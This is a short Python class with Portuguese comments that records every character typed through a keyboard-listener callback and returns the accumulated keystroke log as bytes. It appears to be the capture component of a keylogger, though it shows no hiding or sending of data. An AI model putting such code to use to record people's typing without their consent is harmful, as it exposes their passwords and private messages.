class Key:
    def __init__(self):
        self._data = ""

    #Função do Listener do teclado
    def on_release(self,key):
        try:
            if hasattr(key,'char'):           
                self._data += key.char
        except AttributeError as e:
            print(e)

    #Função para retornar o log de teclas
    def get_keys(self):
        return self._data.encode('utf-8')